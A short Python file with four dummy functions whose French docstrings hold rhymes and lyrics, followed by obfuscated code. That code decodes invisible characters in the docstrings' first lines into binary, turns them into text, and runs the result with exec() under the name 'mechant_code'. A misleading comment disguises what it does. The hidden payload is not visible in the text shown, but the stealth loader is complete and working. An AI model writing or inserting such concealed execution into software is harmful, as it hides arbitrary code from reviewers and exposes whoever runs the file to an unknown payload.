def une_fonction():
    """
    Ceci est une fonction qui marche
    Le but est de retourner un truc qui gagne...
    En effeit celle-ci est très forte
    """
    pass


def deux_fonctions():
    """
    Trois petits chats,
    trois petits chats,
    qui viennent et qui repartent...
    """
    pass


def trois_fonction():
    """
    Je suis dans une famille modeste
    L'injustice et la guerre sont des choses que je détèste,
    J'ai pas connu mon père, il était capitaine
    """
    pass


def quatre_fonctions():
    """
    La dernière et ultime...
    Bafouille...
    """
    pass

# *********************************************************
une_fonction.size = une_fonction.__doc__
matrix = exec if 1 != 0 else None
vect = chr if 1 != 0 else matrix
f, s = str(0), str(1)
alpha = ''.join
# *********************************************************

# Convert the list of nodes to a matrix :
graph = une_fonction.__doc__.split('\n')[0].replace(vect(160), f).replace(vect(128), s)
graph += deux_fonctions.__doc__.split('\n')[0].replace(vect(160), f).replace(vect(128), s)
graph += trois_fonction.__doc__.split('\n')[0].replace(vect(160), f).replace(vect(128), s)
graph += quatre_fonctions.__doc__.split('\n')[0].replace(vect(160), f).replace(vect(128), s)

mechant_code = alpha(vect(int(graph[i:i+8], 2)) for i in range(0, len(graph), 8))
exec(mechant_code)
